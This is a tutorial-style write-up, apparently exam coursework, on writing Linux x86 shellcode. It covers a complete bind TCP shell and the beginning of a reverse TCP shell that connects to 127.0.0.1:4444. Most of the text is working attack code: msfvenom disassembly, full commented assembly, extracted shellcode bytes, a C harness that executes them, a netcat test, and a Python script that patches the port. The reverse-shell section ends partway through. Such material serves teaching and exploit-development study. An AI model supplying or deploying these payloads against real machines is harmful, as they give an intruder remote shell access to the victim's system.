# Assignments

[Assignment 1: Bind TCP Shell](#assignment-1)

[Assignment 2: Reverse TCP Shell](#assignment-2:-reverse-tcp-shell)

## Disclaimer

- Be aware I have created each writeup as standalone projects, you dont have to read one to understand another.
- Don't feel like you have to read it in order, each individula writeup will contain all the information for the topic.
- If you're just looking for the completed shellcode you can find it on my [github](https://github.com/CryptoBreach) or near the end of each assignment.


# Assignment 1

# Bind TCP Shell
Create the shellcode for a Bind TCP Shell payload that binds to a port and execute a shell on an incoming connection, the port number should be easy to configure.

## Requirements
- Create Bind Shell TCP shellcode
- Reverse connects to configured PORT
- Execs Shell on successful connection
- Port should be easily configurable

## Context
Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but create your own as well.


## Prerequisites

- Basic understanding of registers
- Basic understanding of stack and memory
- An interest in the subject


## Approach

There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
To better understand what's happening, we're going to reverse enginner and analyze it.

```markdown
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# msfvenom --arch x86 --platform linux --payload linux/x86/shell_bind_tcp R | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 78 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```


## Analyzing the output

Now if you're not experienced with assembly, I'm sure your very confused right now. 
That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. 
int 0x80 is the assembly language instruction that is used to invoke system calls in Linux on x86 (i.e., Intel-compatible) processors.
So now we understand the shellcode is making multiple syscalls!

You can read more about interrupts here [here](http://www.linfo.org/int_0x80.html)

## Syscalls

If you didn't know what a syscall is, at a very high level you could say a system call is the fundamental interface between an application and the Linux kernel.

You can read more about syscalls [here](https://man7.org/linux/man-pages/man2/syscalls.2.html)

So conintuing on with the shellcode, moving up 1 position we see the instruction "mov al,0x66". If we convert that frox hexadecimal to decimal we get 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. If we inspect "/usr/include/i386-linux-gnu/asm/unistd_32.h" we can see syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```


## What is a socketcall? 

Well put simply, it's a common kernel entry point for socket system calls. 

If we read the documentation [here](https://man7.org/linux/man-pages/man2/socketcall.2.html) we can see it takes 2 parameters:
socketcall(int call, unsigned long *args). 

This is important to know for when we replicate this syscall. When you're working with assembly, you need to make sure you invoke everything correctly. 

If we read the documentation we can see it takes the socket function as the first parameter, this means that it's deciding how to invoke it.

Let's keep a note of everything we now known about this syscall and move on.


## Syscalls in shellcode

If you go through the shellcode you'll see 6 syscalls happening. If you were to analyze how each function works along with their parameters, well it would take a long time. So I've saved you the trouble and compiled a list of each syscall being invoked in order of when they appear.

```
1. socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
2. socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT(4444),len(16 bytes)))
3. socketcall(SYS_LISTEN, sockfd)
4. socketcall(SYS_ACCEPT, (sockfd)
5. dup2(acceptFD, (0x2,0x1,0x0))
6. execve(/bin//sh0x00)
```

Now I encourage you to actually go through the documentation of each so you have a fundamental understanding of what's actually happening.
You can find the documentation for each below:

```
1. https://man7.org/linux/man-pages/man2/socketcall.2.html
2. https://man7.org/linux/man-pages/man2/bind.2.html
3. https://man7.org/linux/man-pages/man2/listen.2.html
4. https://man7.org/linux/man-pages/man2/accept.2.html
5. https://man7.org/linux/man-pages/man2/dup.2.html
6. https://man7.org/linux/man-pages/man2/execve.2.html
```

If you're just looking for a quick and dirty explanation I've got you covered too.

```
1. socketcall(SYS_SOCKET) creates a kernel entry point for socket system calls
2. socketcall(SYS_BIND) assigns an address to a socket referred to by the sockfd file descriptor
3. socketcall(SYS_LISTEN) marks the socket as passive, meaning it will be used to accept incoming connection requests using accept().
4. socketcall(SYS_ACCEPT) extracts the connection request for the listening socket and creates a new connected socket. The newly created socket is not in the listening state.
5. dup2(sockfd,*) creates a copy of the file descriptor and uses the new specified file descriptor
6. execve(/bin//sh0x00) executes the program referred to by pathname, which in this case is "/bin//sh"
```

Now that we know all the syscalls a simple shell-bind-tcp is making, we can replicate it in our own assembly code!


## Creating our own socket()

If you can remember, "socketcall(SYS_SOCKET)" is reponsible for the creation of a socket, which is our first step in creating this bind shell.

This can be achieved with the syscall "socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))".

In assembly that looks like this:
Note: I've added comments to show how each instruction interacts with the syscall.
```
 ; [+] Setting up socketcall() for SYS_SOCKET
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; EAX = socketcall()
        ; EBX = SYS_SOCKET[1]
        ; ECX = (int domain, int type, int protocol)
        xor    eax,eax  ;
        mov    al,0x66  ; setting syscall as socketcall() [REF1]
        xor    ebx,ebx  ;
        push   ebx      ; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)       :       [socket_struct --> REF3]
        inc    ebx      ; setting EBX 0x1 (socketcall: SYS_SOCKET[1])                           :       [socketCall_struct --> REF4]
        push   ebx      ; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1])        :       [socket --> REF2]
        push   0x2      ; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])        :       [socket --> REF2]
        mov    ecx,esp  ; ECX points to args on stack for socket()                              :       [socket_struct --> REF3]
        int    0x80     ; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))
	xor    esi,esi	;
	mov    esi,eax 	; save sockfd in ESI for future syscalls
```

## Attaching the bind() property to our socket

Now that we have our socket, let's go ahead and bind it to an address. In this case we want to bind it to sin_port (port) 4444.

This can be achieved with the syscall "socketcalll(SYS_BIND,(sockfd,(socketArgs, 4444),addrlen(4444))".

In assembly that looks like this:
```
; [+] Setting up socketcall() for SYS_BIND
        ; int socketcall(int call, unsigned long *args)
        ; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
        ; EAX = socketcall
        ; EBX = SYS_BIND[2]
        ; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        mov    al,0x66  ; setting syscall as socketcall()
        pop    ebx      ; setting EBX to 0x2 (socketcall: SYS_BIND[2])                          :       [socketcall --> REF1]
        pop    edx      ; removing 0x1 from stack
        xor    edx,edx  ;
        push   edx      ; setting ECX param in memory - NULLBREAK
        push   word 0x5c11      ; setting ECX param in memory - 0x5c11,0x00 (PORT)              :       [bind --> REF5]
        push   0x10     ; setting ECX in memory - 0x10 is 16 bytes - 0x10,0x5c11,0x00           :       [bind --> REF5]
        push   ecx      ; setting ECX in memory - *SYS_SOCKET-struct,0x10,0x5c11,0x00           :       [bind --> REF5] 
        push   esi      ; pushing socket fd onto stack  (SYS_SOCKET-sockfd)                     :       [bind --> REF5]
        mov    ecx,esp  ; save pointer of BIND args into ecx                                    :       [bind --> REF5]
        int    0x80     ; calling socketcalll(SYS_BIND,(sockfd, sockaddr(4444), addrlen(16 bytes))
```


## Listening on our socket
To actually accept connections, we first need to listen on the socket. Let's do just that.

This can be achieved with the syscall "socketcall(SYS_LISTEN, sockfd)":

In assembly that looks like this:
```
; [+] socketcall() to SYS_LISTEN
        ; int socketcall(int call, unsigned long *args)
        ; int listen(int sockfd, int backlog)
        ; EAX = socketcall
        ; EBX = SYS_LISTEN[4]
        ; ECX = ADDRESS-SYS_BIND-SOCKFD
        mov    al,0x66  ; setting EAX to socketcall() syscall
        mov    bl,0x4   ; setting EBX to 0x4 (socketcall: SYS_LISTEN[4])                        :       [socketcall --> REF1]
        push   esi      ; pushing socket fd onto stack for ECX (sockfd)              :       [listen --> REF6]
        xor    ecx,ecx  ;
        mov    ecx,esp  ; setting ECX to pointer of SYS_SOCKET procedure - (sockfd) :       [listen --> REF6]
        int    0x80     ; [*] Calling: socketcall(SYS_LISTEN, (sockfd)
```


## Accepting incoming connections

Picture this: You invite your friend over to hang out, you've bought food and driks, you've spent a good deal of time planning it. When your friend finally arrives tries he enter but, oh no! The door is locked! This is alright though, because you can just unlock the door and let him in.

Although a broad and not entirely accurate analogy, this is in theory what we need to occur. When we recieve a connection, we want to accept it to get a shell.

This can be achieved with the syscall "socketcall(SYS_ACCEPT)".

In assmebly that looks like this:
```
sys_accept:
        ; [+] socketcall() to SYS_ACCEPT
        ; int socketcall(int call, unsigned long *args)
        ; int accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen)
        ; EAX = socketcall
        ; EBX = SYS_ACCEPT[5]
        ; ECX = ADDRESS-SYS_BIND-SOCKFD
        mov    al,0x66  ; setting EAX to socketcall() syscall
        mov bl,0x5      ; setting EBX to 0x2 (socketcall: SYS_ACCEPT[5])                        :       [socketcall --> REF1]
        push esi        ; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)
        mov ecx,esp     ; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD) :       [accept --> REF7]
        int 0x80        ; [*] Calling: socketcall(SYS_ACCEPT, (*SYS_SOCKET-sockfd)
```

## Setting stdin, stdout and stderr

So with most in not all *NIX systems, you have: stdin, stdout and stderr. The way systems interperet it is as integers: 0x0, 0x1, 0x2.
These 3 determine the accepted data streams. It's imperative that our shell accepts all 3 streams, so let's go ahead and do just that!

This can be achieved with the syscall "dup2(sockfd,(stderr,stdout,stdin))".

In assmebly that looks like this:
```
; [+] dup2(): replacing accept fd with stdin, stdout, stderr fd's: (0x2,0x1,0x0)
        ; int dup2(int oldfd, int newfd);
        ; EAX = dup2
        ; EBX = acceptfd
        ; ECX = (0x2,0x1,0x0)-1) decrementing loop
        xor ebx,ebx     ;
        mov ebx,eax     ; After accept connection, save acceptfd to EBX (SYS_ACCEPT-ACCEPTFD)   
        xor ecx,ecx     ; 
        mov cl,0x2      ; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
        dup2_loop:
        push   0x3f     ; using push/pop this time for fun. same as using mov eax,0x3f
        pop    eax      ; setting EAX to dup2() syscall                                         :       [dup2 --> REF8]
        int    0x80     ; [*] Calling: dup2(acceptFD, (0x2,0x1,0x0))
        dec    ecx      ; decrementing loop counter for each iteration
        jns    dup2_loop;  loop up to dup2_loop if not sign (If ECX is positive (0,1,2) then loop, else if negative (0,-1 etc) then continue down)
```

## Our shell

We've got all our pieces in place now, all we need is to execute a shell on connection! 

This can be achieved with the syscall "execve(/bin//sh0x00)".

I think a nice simple "/bin/sh" will work perfectly for our needs.

In assmebly that looks like this:

```
ExecveShell:
        ; [+] execve(): executing /bin//sh      
        ; int execve(const char *pathname, char *const argv[], char *const envp[])
        ; EAX = execve
        ; EBX = /bin//sh
        ; ECX = args followed by 0x00
        xor    eax,eax  ;
        mov    al,11    ; setting EAX to execve syscall
        xor    ebx,ebx  ;
        push   ebx      ; execve requires NULLBYTE after arguments (0x00)                       :       [execve --> REF9]
        push   0x68732f2f ; sh//
        push   0x6e69622f ; nib/ - Pushing /bin//sh onto stack in reverse for EBX               :       [execve --> REF9]
        mov    ebx,esp  ; setting EBX to address of /bin//sh
        xor    ecx,ecx
        xor    esi,esi
        int    0x80     ; [*] Calling: execve(/bin//sh0x00)
```

## Putting it all together

If you followed all the steps you should have an assembly file that looks similar to this:

```
global _start

section .text

_start:
;sys_socket:
	; [+] Setting up socketcall() for SYS_SOCKET
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	


save_sockfd:
	xor esi,esi	;
	mov esi,eax 	; save sockfd in ESI for future syscalls


sys_bind:
	; [+] Setting up socketcall() for SYS_BIND
	; int socketcall(int call, unsigned long *args)
	; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_BIND[2]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov    al,0x66	; setting syscall as socketcall()
	pop    ebx	; setting EBX to 0x2 (socketcall: SYS_BIND[2])				:	[socketcall --> REF1]
	pop    edx	; removing 0x1 from stack
	xor    edx,edx	;
	push   edx	; setting ECX param in memory - NULLBREAK
	push   word 0x5c11	; setting ECX param in memory - 0x5c11,0x00 (PORT)		:	[bind --> REF5]
	push   0x10	; setting ECX in memory - 0x10 is 16 bytes - 0x10,0x5c11,0x00		:	[bind --> REF5]
	push   ecx	; setting ECX in memory - *SYS_SOCKET-struct,0x10,0x5c11,0x00		:	[bind --> REF5]	
	push   esi	; pushing socket fd onto stack  (SYS_SOCKET-sockfd)			: 	[bind --> REF5]
	mov    ecx,esp	; save pointer of BIND args into ecx					:	[bind --> REF5]
	int    0x80	; calling socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))


sys_listen:
	; [+] socketcall() to SYS_LISTEN
	; int socketcall(int call, unsigned long *args)
	; int listen(int sockfd, int backlog)
	; EAX = socketcall
	; EBX = SYS_LISTEN[4]
	; ECX = ADDRESS-SYS_BIND-SOCKFD
	mov    al,0x66  ; setting EAX to socketcall() syscall
	mov    bl,0x4	; setting EBX to 0x4 (socketcall: SYS_LISTEN[4])			:	[socketcall --> REF1]
	push   esi	; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)		:	[listen --> REF6]
	xor    ecx,ecx	;
	mov    ecx,esp	; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD)	:	[listen --> REF6]
	int    0x80	; [*] Calling: socketcall(SYS_LISTEN, (*SYS_SOCKET-sockfd)


sys_accept:
	; [+] socketcall() to SYS_ACCEPT
	; int socketcall(int call, unsigned long *args)
	; int accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen)
	; EAX = socketcall
	; EBX = SYS_ACCEPT[5]
	; ECX = ADDRESS-SYS_BIND-SOCKFD
	mov    al,0x66	; setting EAX to socketcall() syscall
	mov bl,0x5	; setting EBX to 0x2 (socketcall: SYS_ACCEPT[5])			:	[socketcall --> REF1]
	push esi	; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)
	mov ecx,esp	; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD)	:	[accept --> REF7]
	int 0x80	; [*] Calling: socketcall(SYS_ACCEPT, (*SYS_SOCKET-sockfd)


dup2_setup:
	; [+] dup2(): replacing accept fd with stdin, stdout, stderr fd's: (0x2,0x1,0x0)
	; int dup2(int oldfd, int newfd);
	; EAX = dup2
	; EBX = acceptfd
	; ECX = (0x2,0x1,0x0)-1) decrementing loop
	xor ebx,ebx	;
	mov ebx,eax	; After accept connection, save acceptfd to EBX (SYS_ACCEPT-ACCEPTFD)	
	xor ecx,ecx	; 
	mov cl,0x2	; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
	push   0x3f	; using push/pop this time for fun. same as using mov eax,0x3f
	pop    eax	; setting EAX to dup2() syscall						:	[dup2 --> REF8]
	int    0x80	; [*] Calling: dup2(acceptFD, (0x2,0x1,0x0))
	dec    ecx	; decrementing loop counter for each iteration
	jns    dup2_loop;  loop up to dup2_loop if not sign (If ECX is positive (0,1,2) then loop, else if negative (0,-1 etc) then continue down)


ExecveShell:
	; [+] execve(): executing /bin//sh	
	; int execve(const char *pathname, char *const argv[], char *const envp[])
	; EAX = execve
	; EBX = /bin//sh
	; ECX = args followed by 0x00
	xor    eax,eax	;
	mov    al,11	; setting EAX to execve syscall
	xor    ebx,ebx	;
	push   ebx	; execve requires NULLBYTE after arguments (0x00)			:	[execve --> REF9]
	push   0x68732f2f ; sh//
	push   0x6e69622f ; nib/ - Pushing /bin//sh onto stack in reverse for EBX		:	[execve --> REF9]
	mov    ebx,esp	; setting EBX to address of /bin//sh
	xor    ecx,ecx
	xor    esi,esi
	int    0x80	; [*] Calling: execve(/bin//sh0x00)
```

If you didn't you do now!

For your own sake, make sure you read over it and fully understand it. It'll help you to understand how it works on a fundamental level.


## Testing our bind shell

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```


You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and link it like so:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ./compile-shell-dump.sh bind_shell_tcp

Shellcode: 
\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\xb0\x66\x5b\x5a\x31\xd2\x52\x66\x68\x11\x5c\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x31\xc9\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\xcd\x80
Shellcode size: 99 bytes
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ls
bind_shell_tcp  bind_shell_tcp.asm  bind_shell_tcp.o  compile-shell-dump.sh
```


Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.
```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\xb0\x66\x5b\x5a\x31\xd2\x52\x66\x68\x11\x5c\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x31\xc9\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\xcd\x80";

main(){

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
```

And we're done!

## Testing our shell

To test our shell we'll execute our C file, don't be alarmed if it hangs, it should be doing that as it's waiting for a connection:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ./testingShellcode
Shellcode Length: 99

```

Now in another terminal we check that the port is running, and it is!:
```
root@ubuntu:/home/ubuntu# netstat -antp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      4917/testingShellco
```

All that's left to test is the accept and execve syscalls...
```
root@ubuntu:/home/ubuntu# nc 127.0.0.1 4444
```


It works! We've successfully created a shell-bind-tcp from scratch!
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# ./testingShellcode
Shellcode Length: 99
# 
```

I hope you enjoyed learning how to create a simple shell-bind-tcp using shellcode!

As an added bonus, I've included a python script that allows you to dynamically restructure shellcode to allow for the swapping of ports.

```
#!/usr/bin/python
import sys
    
if len(sys.argv) != 2:
  print "Please enter port number..."
  sys.exit()
    
port_number     = int(sys.argv[1])
bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
Filter        = [b for b in bts if b > 0]
Format       = ["\\x" + format(b, 'x') for b in Filter]
PostJoining          = "".join(Format)
    
oldShellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
oldShellcode +="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
oldShellcode +="\\x51\\x66\\x68" + PostJoining + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
oldShellcode +="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
oldShellcode +="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
oldShellcode +="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
oldShellcode +="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
oldShellcode +="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
    
print("\nShellcode with port " + str(port_number) + " is: " + oldShellcode)
```
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# python port-changer.py 4444

Shellcode with port 4444 is: \x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# cat port-changer.py
```


# Assignment 2: Reverse TCP Shell
Create a shell_reverse_tcp shellcode that connects back to an IP address, on a specific a port and execute a shell. The IP address and port number should be easily configurable.


## Requirements
- Create Reverse Shell TCP shellcode
- Reverse connects to configured IP and PORT
- Execs Shell on successful connection
- IP and Port should be easily configurable

## Approach
There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
To better understand what's happening, we're going to reverse enginner and analyze it.

```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 port=4444 | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 68 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  687F000001        push dword 0x100007f
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```


## Analyzing the output

Now if you're not experienced with assembly, I'm sure your very confused right now. 
That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. 
int 0x80 is the assembly language instruction that is used to invoke system calls in Linux on x86 (i.e., Intel-compatible) processors.
So now we understand the shellcode is making multiple syscalls!

You can read more about interrupts here [here](http://www.linfo.org/int_0x80.html)

## Syscalls

If you didn't know what a syscall is, at a very high level you could say a system call is the fundamental interface between an application and the Linux kernel.

You can read more about syscalls [here](https://man7.org/linux/man-pages/man2/syscalls.2.html)

So conintuing on with the shellcode, moving up 1 position we see the instruction "mov al,0x66". If we convert that frox hexadecimal to decimal we get 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. If we inspect "/usr/include/i386-linux-gnu/asm/unistd_32.h" we can see syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```

## What is a socketcall? 

Well put simply, it's a common kernel entry point for socket system calls. 

If we read the documentation [here](https://man7.org/linux/man-pages/man2/socketcall.2.html) we can see it takes 2 parameters:
socketcall(int call, unsigned long *args). 

This is important to know for when we replicate this syscall. When you're working with assembly, you need to make sure you invoke everything correctly. 

If we read the documentation we can see it takes the socket function as the first parameter, this means that it's deciding how to invoke it.

Let's keep a note of everything we now known about this syscall and move on.


## Syscalls in shellcode

If you go through the shellcode you'll see 6 syscalls happening. If you were to analyze how each function works along with their parameters, well it would take a long time. So I've saved you the trouble and compiled a list of each syscall being invoked in order of when they appear.

```
1. socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
2. socketcalll(SYS_CONNECT,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT(127.0.0.1,4444),len(16 bytes)))
3. dup2(acceptFD, (0x2,0x1,0x0))
4. execve(/bin//sh0x00)
```

Now I encourage you to actually go through the documentation of each so you have a fundamental understanding of what's actually happening.
You can find the documentation for each below:

```
1. https://man7.org/linux/man-pages/man2/socketcall.2.html
2. https://man7.org/linux/man-pages/man2/bind.2.html
3. https://man7.org/linux/man-pages/man2/dup.2.html
4. https://man7.org/linux/man-pages/man2/execve.2.html
```

If you're just looking for a quick and dirty explanation I've got you covered too.

```
1. socketcall(SYS_SOCKET) creates a kernel entry point for socket system calls
2. socketcall(SYS_CONNECT) connects a socket with a specified address (IP,PORT)
4. dup2(sockfd,*) creates a copy of the file descriptor and uses the new specified file descriptor
5. execve(/bin//sh0x00) executes the program referred to by pathname, which in this case is "/bin//sh"
```

Now that we know all the syscalls a simple shell-bind-tcp is making, we can replicate it in our own assembly code!

## Creating our own socket()

If you can remember, "socketcall(SYS_SOCKET)" is reponsible for the creation of a socket, which is our first step in creating this bind shell.

This can be achieved with the syscall "socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))".

In assembly that looks like this:
Note: I've added comments to show how each instruction interacts with the syscall.

```
; [+] Setting up socketcall() for SYS_SOCKET
